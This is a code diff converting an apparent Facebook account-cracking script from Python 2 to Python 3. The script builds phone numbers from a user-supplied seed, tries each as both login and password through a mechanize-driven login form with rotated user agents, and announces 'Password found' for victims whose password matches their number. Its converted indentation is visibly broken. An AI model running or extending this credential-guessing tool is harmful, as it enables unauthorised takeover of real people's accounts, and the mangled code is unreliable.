@@ -7,7 +7,7 @@
 import sys
 import random
 import mechanize
-import cookielib
+from http import cookiejar
 import urllib,re
 
 
@@ -26,18 +26,18 @@ contact me via facebook @oghenevwegbaVT for more info if you encounter any probl
 or via email: mikethankgod@gmail.com
 
 '''
-print GHT
-print "Note: - This tool can check if the user name and password of the victim are same"
-print "# Hit CTRL+C to quit the program"
-print "# Just provide a seed phone number the app will generate the rest ^_^"
-print "Note: - Phone number can be entered in different format as long as the three input are filled with just one phone number"
+print(GHT)
+print("Note: - This tool can check if the user name and password of the victim are same")
+print("# Hit CTRL+C to quit the program")
+print("# Just provide a seed phone number the app will generate the rest ^_^")
+print("Note: - Phone number can be entered in different format as long as the three input are filled with just one phone number")
 
 
-email = str(raw_input("# Enter |First Three Digit of Phone number|: "))
-passwordlist = int(raw_input("# Enter |Middle Digit of Phone number|:  "))
-last = str(raw_input("# Enter |Last Two Digits of Phone number|:  "))
+email = str(input("# Enter |First Three Digit of Phone number|: "))
+passwordlist = int(input("# Enter |Middle Digit of Phone number|:  "))
+last = str(input("# Enter |Last Two Digits of Phone number|:  "))
 
-number = int(raw_input("number if account "))
+number = int(input("number if account "))
 
 
 
@@ -55,30 +55,29 @@ def attack(password,e,las):
 		
 		password +=1
                 
-	 	try:
-		   
-		     print "\n\n\n [*] aCCount number ",c+1
-		     br.addheaders = [('User-agent', random.choice(useragents))]
-		     site = br.open(login)
-		     br.select_form(nr=0)
+        try:
+            print("\n\n\n [*] aCCount number {}".format(c+1))
+            br.addheaders = [('User-agent', random.choice(useragents))]
+            site = br.open(login)
+            br.select_form(nr=0)
 
-		     ##Facebook
-		     p = str(password)
-		     br.form['email'] = e+p+las
+            ##Facebook
+            p = str(password)
+            br.form['email'] = e+p+las
 		     br.form['pass'] = e+p+las
 		     br.submit()
 		     log = br.geturl()
-		     print "[*] user name ",e+p+las
-                     print "[*] user password ", e+p+las
-		     print log[25:27]
-		     if log[25:27] == 'lo':
-			print "wrong password"	
+            print("[*] user name ",e+p+las)
+                     print("[*] user password ", e+p+las)
+             print(log[25:27])
+             if log[25:27] == 'lo':
+            print("wrong password")	
                      elif log[25:27] == 'ch':
-			print "Blocked account"
-		     else:
-			
-			print "\n\n\n [*] Password found .. !!"
-			print "\n [*] Password : %s\n" % e+str(password)+las
+            print("Blocked account")
+             else:
+            
+            print("\n\n\n [*] Password found .. !!")
+            print("\n [*] Password : %s\n" % e+str(password)+las)
 			sys.exit(1)
 			
 		     c +=1
